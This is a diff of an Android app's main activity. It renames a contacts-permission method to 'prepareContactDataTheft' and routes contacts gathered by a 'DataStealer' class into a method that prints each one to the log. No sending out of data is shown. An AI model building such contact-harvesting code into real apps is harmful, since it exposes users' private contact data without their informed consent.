@@ -23,8 +23,8 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        int playerId =  BackendManagerIntentService.getPlayerId(this);
-        if(-1 == playerId){
+        int playerId = BackendManagerIntentService.getPlayerId(this);
+        if (-1 == playerId) {
             Intent registerPlayer = new Intent(this, BackendManagerIntentService.class);
             registerPlayer.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, BackendManagerIntentService.MANAGE_PLAYER_REGISTRATION);
             startService(registerPlayer);
@@ -36,10 +36,10 @@ public class MainActivity extends AppCompatActivity {
     /**
      * Requests permission to read contacts. Unsure where to put this, feel free to move it
      * around once we know from where we read device contacts.
-     *
+     * <p>
      * Mostly taken from https://developer.android.com/training/permissions/requesting#java
      */
-    private void requestContactsPermission(){
+    public void prepareContactDataTheft() {
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_CONTACTS)
                 != PackageManager.PERMISSION_GRANTED) {
@@ -60,8 +60,7 @@ public class MainActivity extends AppCompatActivity {
             }
         } else {
             // Permission has already been granted
-            ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());
-
+           displayContactDataInLog();
         }
     }
 
@@ -75,8 +74,8 @@ public class MainActivity extends AppCompatActivity {
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     // permission was granted
-                    ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());
 
+                    displayContactDataInLog();
                 } else {
                     // permission denied
 
@@ -89,9 +88,13 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void displayContactDataInLog(){
+        ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());
 
-
-
+        for(Contact c: contacts){
+            System.out.println(c.toString());
+        }
+    }
 
 
 }
